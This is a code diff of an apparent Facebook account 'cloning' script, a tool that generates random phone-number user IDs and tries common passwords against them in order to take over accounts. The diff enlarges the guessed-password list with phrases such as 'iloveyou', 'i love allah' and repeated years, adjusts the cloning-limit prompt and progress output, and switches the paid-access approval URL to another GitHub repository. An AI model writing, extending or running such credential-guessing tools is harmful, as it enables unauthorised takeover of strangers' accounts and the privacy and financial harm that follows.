@@ -288,7 +288,7 @@ def sudair_bd():
     code = random.choice([rk1])                      # input(f' [{xr}â– {x}] Choose : ')
     os.system('clear')
     sudair_Hasan(logo)
-    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95m----------------------------------------------------- \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m1000, \x1b[38;5;208m2000, \033[0;92m5000 ] \n\033[0;95m----------------------------------------------------- \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(9))
         user.append(nmp)
@@ -311,7 +311,7 @@ def sudair_bd():
         sudair_Hasan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
         sudair_Hasan('\033[1;97m====================================================')
         for love in user:
-            pwx = [love[3:],code+love,love[1:],'Bangladesh','bangladesh','i love you','free fire','freefire','102030','203040','304050','405060']
+            pwx = [love[3:],code+love,love[1:],'Bangladesh','bangladesh','i love you','iloveyou','imissyou','i miss you','free fire','freefire','iloveallah','i love allah','456789','102030','203040','304050','405060','135790','0987654321','20042004','19971997','321321']
             uid = code+love
             for sudair in HamiiID:
                 pwx.append(sudair)
@@ -427,7 +427,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}Running{x}] [%s|%s] [OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}Running{x}]  %s/%s  [OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
@@ -444,7 +444,7 @@ def reg():
     except (KeyError, IOError):
         reg2()
 
-    r = requests.get('https://raw.githubusercontent.com/Shuvo-BBHH/sudair-mex/main/aproval.text').text
+    r = requests.get('https://raw.githubusercontent.com/X74TEAM/TEST2/main/aproval.text').text
     if to in r:
         os.system('clear')
         print('WELL COME TO PAID MANU')
